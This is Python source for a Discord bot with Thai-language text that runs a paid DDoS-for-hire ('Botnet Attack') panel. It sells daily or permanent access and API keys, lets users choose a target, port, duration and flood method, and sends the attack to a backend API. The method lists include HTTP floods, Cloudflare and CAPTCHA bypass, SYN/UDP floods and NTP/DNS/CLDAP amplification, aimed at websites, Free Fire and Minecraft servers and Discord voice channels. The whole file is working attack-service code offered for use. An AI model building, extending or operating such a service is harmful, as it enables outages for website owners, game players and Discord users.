# bot.py — valan discord bot
import asyncio, time, re, aiohttp, discord
from discord.ext import commands
import db
from config import (
    BOT_TOKEN, PANEL_USERNAME, API_SELF, API_PUBLIC,
    MAX_TIME, MAX_CONCURRENT, PANEL_COLOR,
    EMO_STAR, EMO_WALLET, EMO_BOLT, FORBIDDEN_TLDS,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

# ---- method lists ----
L7_LIST = [
    "GET","POST","OVH","RHEX","STOMP","STRESS","DYN","DOWNLOADER","SLOW",
    "HEAD","NULL","COOKIE","PPS","EVEN","GSB","DGB","AVB","BOT","APACHE",
    "XMLRPC","CFB","CFBUAM","BYPASS","BOMB","KILLER","TOR",
]
L4_LIST = [
    "TCP","UDP","SYN","OVH-UDP","CPS","ICMP","CONNECTION",
    "VSE","TS3","FIVEM","FIVEM-TOKEN","MEM","NTP","MCBOT","MINECRAFT",
    "MCPE","DNS","CHAR","CLDAP","ARD","RDP",
]

CATEGORY_LIST = [
    ("L7",          " L7 — ยิงเว็บ (HTTP)"),
    ("L4",          " L4 — ยิงเกม (TCP/UDP)"),
    ("VC",          " VC Discord — ยิงห้องเสียง"),
    ("FF",          " Free Fire — ยิงเซิฟ"),
    ("HTTPS",       " ddos-https — massive RPS"),
    ("HTTPSLOAD",   " ddos-httpsload — HTTP Flood"),
    ("BYBROWSER",   " ddos by-browser — HTTP/2 จำลอง Browser (เลี่ยง UAM/CAPTCHA)"),
    ("HTTPSBYPASS", " ddos-https-bypass — HTTP/2 เลี่ยง Cloudflare"),
    ("CDNBYPASS",   " ddos-cdn-bypass — HTTP/2 สำหรับ enterprise (ไม่ใช่ CF)"),
]

# ---- target validation ----
def forbidden_target(t: str):
    s = t.lower().strip()
    if s in ("localhost", "127.0.0.1", "::1"): return "Local IP"
    if re.match(r"^127\.", s) or re.match(r"^10\.", s) or \
       re.match(r"^192\.168\.", s) or \
       re.match(r"^172\.(1[6-9]|2[0-9]|3[01])\.", s) or \
       re.match(r"^169\.254\.", s):
        return "Local IP"
    host = s.split("/")[0].split(":")[0]
    for tld in FORBIDDEN_TLDS:
        if host.endswith(tld): return f"โดเมน {tld} ห้ามยิง"
    return None

# ---- helpers ----
def parse_duration(s: str):
    s = s.strip().lower()
    if s in ("th", "permanent", "ถาวร", "forever"): return 0
    m = re.match(r"^(\d+)([smhd])$", s)
    if not m: return None
    n, unit = int(m.group(1)), m.group(2)
    return int(time.time()) + n * {"s":1,"m":60,"h":3600,"d":86400}[unit]

def fmt_expiry(exp):
    if exp == 0: return "ถาวร (TH)"
    return time.strftime("%Y-%m-%d %H:%M UTC", time.gmtime(exp))

# ---- panel embed ----
def panel_embed():
    e = discord.Embed(color=PANEL_COLOR)
    e.description = (
        f"# {EMO_STAR} Botnet Attack\n"
        f"{EMO_WALLET} สนใจติดต่อ Tk มาลายค้าบ วันละ **40** / ถาวร **300 TH**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"**กฎการใช้งาน**\n"
        f"ห้ามยิง Local IP `127.0.0.1` อย่างเดียวพอ\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"{EMO_BOLT} **Ddos ได้**\n"
        f"เว็บอะไรก็ได้นอกจากเว็บต้องห้าม\n\n"
        f"เซิร์ฟ ฟีฟาย\n"
        f"เซิร์ฟ มายคราฟ\n"
        f"ห้องเสียง Discord"
    )
    return e

# ---- UI ----
class TargetModal(discord.ui.Modal):
    t_target = discord.ui.TextInput(label="IP:URL (TARGET)", placeholder="example.com", required=True)
    t_port   = discord.ui.TextInput(label="PORT (1-65535)", placeholder="443", required=True)
    t_time   = discord.ui.TextInput(label=f"TIME (MAX {MAX_TIME})", placeholder="60", required=True)

    def __init__(self, category: str):
        super().__init__(title="Target")
        self.category = category

    async def on_submit(self, interaction: discord.Interaction):
        target = self.t_target.value.strip()
        f = forbidden_target(target)
        if f:
            await interaction.response.send_message(f"❌ {f}", ephemeral=True); return
        try:
            port = int(self.t_port.value)
            if not 1 <= port <= 65535: raise ValueError
        except ValueError:
            await interaction.response.send_message("❌ PORT ไม่ถูกต้อง", ephemeral=True); return
        try:
            dur = int(self.t_time.value)
            if not 1 <= dur <= MAX_TIME: raise ValueError
        except ValueError:
            await interaction.response.send_message(f"❌ TIME ต้องอยู่ 1-{MAX_TIME}", ephemeral=True); return

        cat = self.category
        if cat in ("L7", "L4"):
            await interaction.response.send_message(
                "เลือก method:", view=MethodView(cat, target, port, dur), ephemeral=True,
            )
        elif cat == "VC":
            await interaction.response.send_message("ยิง VC Discord...", ephemeral=True)
            await launch(interaction, target, port, dur, "VC_DISCORD")
        elif cat == "FF":
            await interaction.response.send_message("ยิง Free Fire...", ephemeral=True)
            await launch(interaction, target, port, dur, "FREEFIRE")
        else:
            await interaction.response.send_message(f"ยิง {cat}...", ephemeral=True)
            await launch(interaction, target, port, dur, cat)

class MethodView(discord.ui.View):
    def __init__(self, layer, target, port, dur):
        super().__init__(timeout=120)
        opts = L7_LIST if layer == "L7" else L4_LIST
        sel = discord.ui.Select(
            placeholder=f"เลือก {layer} method",
            options=[discord.SelectOption(label=m, value=m) for m in opts[:25]],
        )
        sel.callback = self._pick
        self.add_item(sel)
        self.target, self.port, self.dur = target, port, dur

    async def _pick(self, interaction: discord.Interaction):
        method = interaction.data["values"][0]
        await interaction.response.edit_message(
            content=f"ยิง {method} ไปที่ `{self.target}:{self.port}` นาน {self.dur}s",
            view=None,
        )
        await launch(interaction, self.target, self.port, self.dur, method)

class CategoryView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=120)
        sel = discord.ui.Select(
            placeholder="เลือกประเภทการยิง",
            options=[discord.SelectOption(label=l, value=v) for v, l in CATEGORY_LIST[:25]],
        )
        sel.callback = self._pick
        self.add_item(sel)

    async def _pick(self, interaction: discord.Interaction):
        cat = interaction.data["values"][0]
        await interaction.response.send_modal(TargetModal(cat))

class PanelButton(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(
        label="ใช้งานบอท",
        style=discord.ButtonStyle.secondary,
        emoji="⚡",
        custom_id="valan_open",
    )
    async def open_panel(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not db.is_vip(interaction.user.id):
            await interaction.response.send_message(
                "❌ ไม่มีสิทธิ์ใช้ มาซื้อ api วันละ 30 ใช้งานบอทก็วันละ 30 TK มาได้เลยครับ",
                ephemeral=True,
            ); return
        await interaction.response.send_message(
            "เลือกประเภทการยิง:", view=CategoryView(), ephemeral=True,
        )

async def launch(interaction: discord.Interaction, target, port, dur, method):
    user_id = interaction.user.id
    keys = db.list_keys(user_id)
    key = None
    for k, created, exp, active in keys:
        if active and (exp == 0 or exp > int(time.time())):
            key = k; break
    if key is None:
        key = db.create_key(user_id, 0)

    async with aiohttp.ClientSession() as session:
        params = {"key": key, "target": target, "port": port,
                  "time": dur, "method": method}
        try:
            async with session.get(f"{API_SELF}/attack", params=params, timeout=10) as r:
                data = await r.json()
        except Exception as e:
            await interaction.followup.send(f"❌ API error: {e}", ephemeral=True); return

    if data.get("status") != "started":
        await interaction.followup.send(f"❌ {data.get('message','error')}", ephemeral=True); return

    e = discord.Embed(color=PANEL_COLOR)
    e.description = (
        f"✅ **ยิงแล้ว**\n"
        f"Target: `{target}:{port}`\n"
        f"Method: `{method}`\n"
        f"Time: `{dur}s`\n"
        f"ID: `{data['id']}`\n"
        f"Concurrent: `{data['concurrent']}/{data['max_concurrent']}`"
    )
    await interaction.followup.send(embed=e, ephemeral=True)

# ---- events / commands ----
@bot.event
async def on_ready():
    print(f"[+] {bot.user} online")
    bot.add_view(PanelButton())

@bot.command(name="ddos")
async def cmd_ddos(ctx):
    if ctx.author.name != PANEL_USERNAME: return
    await ctx.send(embed=panel_embed(), view=PanelButton())

@bot.command(name="vi")
async def cmd_vi(ctx, member: discord.Member = None, duration: str = None):
    if ctx.author.name != PANEL_USERNAME: return
    if not member or not duration:
        await ctx.send("usage: !vi @user 1h | 1d | TH"); return
    exp = parse_duration(duration)
    if exp is None:
        await ctx.send("duration ไม่ถูกต้อง (1h / 1d / TH)"); return
    db.add_vip(member.id, exp)
    await ctx.send(f"✅ {member.mention} ได้สิทธิ์ — หมดอายุ: {fmt_expiry(exp)}")

@bot.command(name="unvi")
async def cmd_unvi(ctx, member: discord.Member = None):
    if ctx.author.name != PANEL_USERNAME: return
    if not member:
        await ctx.send("usage: !unvi @user"); return
    db.remove_vip(member.id)
    await ctx.send(f"✅ ยึดสิทธิ์ {member.mention} แล้ว")

@bot.command(name="api")
async def cmd_api(ctx, action: str = None, duration: str = None):
    if ctx.author.name != PANEL_USERNAME: return
    if action != "+1" or not duration:
        await ctx.send("usage: !api +1 1h | 1d | TH"); return
    exp = parse_duration(duration)
    if exp is None:
        await ctx.send("duration ไม่ถูกต้อง"); return
    key = db.create_key(ctx.author.id, exp)
    url = f"{API_PUBLIC}/attack?key={key}&target=TARGET&port=PORT&time=TIME&method=METHOD"
    status_url = f"{API_PUBLIC}/key/{key}"
    e = discord.Embed(color=PANEL_COLOR, description=(
        f"🔑 **API Key**\n"
        f"```{key}```\n"
        f"หมดอายุ: **{fmt_expiry(exp)}**\n\n"
        f"**Endpoint:**\n`{url}`\n\n"
        f"**Status page (Google-able):**\n{status_url}\n\n"
        f"Concurrent: **{MAX_CONCURRENT}**"
    ))
    await ctx.send(embed=e)

@bot.command(name="mykeys")
async def cmd_mykeys(ctx):
    if ctx.author.name != PANEL_USERNAME: return
    keys = db.list_keys(ctx.author.id)
    if not keys:
        await ctx.send("ไม่มี key"); return
    lines = [f"`{k}` — {fmt_expiry(exp)} ({'active' if act else 'off'})"
             for k, cr, exp, act in keys]
    await ctx.send("\n".join(lines[:20]))

if __name__ == "__main__":
    db.conn()
    bot.run(BOT_TOKEN)